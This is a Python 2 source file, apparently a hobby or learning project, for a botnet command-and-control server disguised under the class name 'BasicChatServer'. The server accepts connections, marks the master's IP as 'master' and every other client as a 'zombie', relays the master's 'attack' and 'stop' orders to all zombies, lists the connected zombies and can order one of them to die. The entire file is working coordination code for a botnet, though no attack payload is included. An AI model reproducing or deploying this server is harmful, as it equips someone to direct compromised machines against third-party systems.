#coding: utf-8
import socket
import thread
import sys
class SocketServer(socket.socket):
    clients = []
    master_ip=""
    def __init__(self):
        # Set hostname and port as argument or default
        socket.socket.__init__(self)
        if len(sys.argv) < 3:
            local_ip = "127.0.0.1"
            self.master_ip = local_ip
            local_port = 4545
        else:
            local_ip = sys.argv[1]
            self.master_ip = local_ip
            local_port = int(sys.argv[2])

        if len(sys.argv) == 4:
            self.master_ip = sys.argv[3]
        # Socket config
        self.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.bind((local_ip, local_port))
        self.listen(5)

    # Main control
    def run(self):
        print "Server started"
        try:
            self.accept_clients()
        except Exception as ex:
            print ex
        except KeyboardInterrupt:
            print ""
        finally:
            print "Server closed"
            self.broadcast("stop")
            for client, role in self.clients:
                client.close()
            self.close()

    # Rotina do servidor
    def accept_clients(self):
        while 1:
            (clientsocket, address) = self.accept()
            #Adding client to clients list
            if address[0] == self.master_ip:
                role = "master"
            else:
                role = "zombie"

            self.clients.append(tuple((clientsocket, role)))
            #Client Connected
            self.onopen(clientsocket, address, role)
            #Receiving data from client
            thread.start_new_thread(self.recieve, (clientsocket,))

    # Rotina da conexão
    def recieve(self, client):
        # Lookup client role
        for i in self.clients:
            if i[0] == client:
                client_role = i[1]

        alive = 1
        # Iterate until die command
        while alive:
            data = client.recv(1024)
            #Message Received
            alive = self.onmessage(client, data, client_role)

        #Removing client from clients list
        self.clients.remove(i)
        #Client Disconnected
        self.onclose(client, client.getpeername(), client_role)
        #Closing connection with client
        client.close()
        #Closing thread
        thread.exit()

    def broadcast(self, message):
        #Sending message to all zombie clients
        for client, role in self.clients:
            if role != "master":
                client.send(message+"\n")

    def multicast(self,message,sender):
        #Sending message to all clients but sender
        for client, role in self.clients:
            if client != sender:
                client.send(message)

    def listzombies(self):
        pass

    def onopen(self, client, address, role):
        pass

    def onmessage(self, client, message, role):
        pass

    def onclose(self, client, address, role):
        pass



class BasicChatServer(SocketServer):

    def __init__(self):
        SocketServer.__init__(self)

    def onmessage(self, client, message,role):
        data = message.rstrip()
        #List of zombies connected
        if data == "list":
            print "Retrieving list of zombies to master"
            list = self.listzombies()
            client.send(list)
        #Sending attack message to zombies
        elif data.startswith("attack"):
            print "Master sent attack order"
            self.broadcast(message)
            client.send("Attack mode activated\n")
        #Sending stop message to zombies
        elif data == "stop":
            print "Master sent stop order"
            self.broadcast(message)
            client.send("Attack mode interrupted\n")

        elif data.startswith("kill"):
            zombie_id = data.strip()[-1]
            if int(zombie_id) <= len(self.clients) and self.clients[int(zombie_id)][1] == "zombie":
                print "Killing zombie " + zombie_id
                zombie = self.clients[int(zombie_id)][0]
                zombie.send("die")

        return data != "die"

    def onopen(self, client, address, role):
        print role.capitalize() + " Connected = " + str(address)

    def onclose(self, client, address, role):
        print role.capitalize() + " Disconnected = " + str(address)

    def listzombies(self):
        #List all clients currently connected
        list = "\n===== List of zombies connected =====\n\n"
        i = 0
        for client, role in self.clients:
            if role == "zombie":
                list += "Zombie #" + str(i) + " - at " + client.getpeername()[0] + " port " + str(client.getpeername()[1]) + "\n"
            i += 1
        return list

def main():
    server = BasicChatServer()
    server.run()

if __name__ == "__main__":
    main()
